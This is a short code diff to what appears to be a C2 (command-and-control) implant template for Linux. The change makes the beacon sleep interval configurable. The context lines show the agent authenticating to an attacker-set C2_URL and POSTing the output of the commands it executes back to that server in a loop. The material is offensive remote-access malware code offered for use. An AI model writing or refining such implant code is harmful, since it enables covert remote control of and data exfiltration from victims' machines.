@@ -16,7 +16,7 @@ C2_URL = 'http://{lhost}:{lport}'
 CLIENT_ID = '{line}'
 USERNAME = '{username}'
 PASSWORD = '{password}'
-
+SLEEP     = {sleep}
 def send_request(url, method='GET', body=None, username=USERNAME, password=PASSWORD):
     headers = {
         'Authorization': 'Basic ' + base64.b64encode(f"{username}:{password}".encode('ascii')).decode('ascii')
@@ -125,7 +125,7 @@ while True:
                 output_str = output.decode('utf-8', errors='replace')
                 json_data = json.dumps({'output': output_str, 'client': 'Linux', 'command': command})
                 send_request(f'{C2_URL}/command/{CLIENT_ID}', method='POST', body=json_data)
-        time.sleep(5)
+        time.sleep(SLEEP)
     except Exception as e:
         print(f'[!] Error: {e}')
         break
